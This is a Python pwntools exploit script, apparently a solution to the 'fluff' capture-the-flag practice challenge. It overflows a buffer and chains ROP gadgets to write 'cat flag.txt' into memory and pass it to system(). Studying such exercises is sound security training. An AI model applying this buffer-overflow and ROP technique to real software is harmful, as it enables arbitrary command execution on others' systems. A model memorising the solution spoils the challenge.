import pwn

BUFFER = "A"*(40)
pop_rdi = 0x00000000004008c3
data_loc = 0x00601050
system_addr = 0x00400810
xor_r11_r11_pop_r14_mov_data_start_to_edi = 0x00400822
pop_12_mov_r13d_604060 = 0x00400832
xor_r11_r12_pop_12_mov_r13d_604060 = 0x0040082f
xchg_r11_r10_pop_r15_mov_r11d_0x602050 = 0x00400840
mov_r11_to_ptr_r10_pop_r13_pop_r12_xor_byte_r10_r12b = 0x0040084e


def add_padding(string):
    pad_len = len(string) % 8
    if pad_len != 0:
        string += ('\x00' * (8 - pad_len))
    return string


def split_string_into_chunks_of_eight(string):
    return [string[i:i+8] for i in range(0, len(string), 8)]


def write_to_r11(value):
    rop = ""
    # write value to r12
    rop += pwn.p64(pop_12_mov_r13d_604060)
    rop += value
    # clears r11
    rop += pwn.p64(xor_r11_r11_pop_r14_mov_data_start_to_edi)
    # clears r14
    rop += pwn.p64(0)
    rop += pwn.p64(xor_r11_r12_pop_12_mov_r13d_604060)
    # clears r12
    rop += pwn.p64(0)

    return rop


def write_to_r10(value):
    """
    write to r10 in because r10 has mov qword[r10] gadget.
    in order to write to r10:
        * populate r11.
        * call the gadget that has xchg  r11, r10
    """
    rop = ""

    rop += write_to_r11(value)
    rop += pwn.p64(xchg_r11_r10_pop_r15_mov_r11d_0x602050)
    # clears r15
    rop += pwn.p64(0)

    return rop


def payload_to_ptr_r10(payload):
    """
    write string to qword[r10], r10 needs to point to the memory we
        wish to write to prior to this chain.
    If we can write to a qword of a register under our control, we win.
    """
    rop = ""
    # write our payload to r11.
    rop += write_to_r11(payload)

    # this gadget moves r11 to qword[r1o]. It also xors byte [r10]
    # with r12b, so we r12 needs be populated with 0.
    rop += pwn.p64(mov_r11_to_ptr_r10_pop_r13_pop_r12_xor_byte_r10_r12b)
    # clears r13
    rop += pwn.p64(0)
    # clears r12 and this is important since we then xor [r10] with r12b
    rop += pwn.p64(0)

    return rop


def write_any_len_str_to_addr(addr_to_write_to, payload_string):
    padded_payload = add_padding(payload_string)
    rop = ""
    payload_chunks = split_string_into_chunks_of_eight(padded_payload)
    for i in range(len(payload_chunks)):
        # this block is the equivalent of the move [reg], reg
        rop += write_to_r10(pwn.p64(data_loc + (i*8)))
        rop += payload_to_ptr_r10(payload_chunks[i])

    return rop


def call_system_with_str(system_loc, string_loc):
    rop = ""
    rop += pwn.p64(pop_rdi)
    rop += pwn.p64(string_loc)
    rop += pwn.p64(system_loc)
    return rop


payload = (BUFFER + write_any_len_str_to_addr(data_loc, "cat flag.txt") +
           call_system_with_str(system_addr, data_loc))

pwn.context.terminal = ['st', '-e', 'sh', '-c']
DEBUG = False

if DEBUG:
    proc = pwn.gdb.debug('./fluff', """
    b * 0x00400804
    b * 0x00000000004008c3
    continue
    """)
else:
    proc = pwn.process("./fluff")

proc.recvuntil(">")
proc.sendline(payload)
print(proc.recvuntil("}"))
